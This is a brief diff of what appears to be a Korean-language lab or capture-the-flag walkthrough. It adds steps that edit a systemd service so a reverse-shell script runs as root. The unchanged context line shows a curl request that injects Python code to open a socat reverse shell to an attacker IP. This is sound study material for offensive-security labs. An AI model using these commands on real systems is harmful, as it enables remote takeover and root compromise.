@@ -286,6 +286,10 @@ curl -X POST --data "code=os.system('socat TCP:192.168.45.185:1337 EXEC:sh')" ht
 
 # 설정파일 수정
 vi /etc/systemd/system/pythonapp.service 
+ExecStart=/home/cmeeks/reverse.sh
+User=root
+
+# 
 
 ```
 ### ZenPhoto
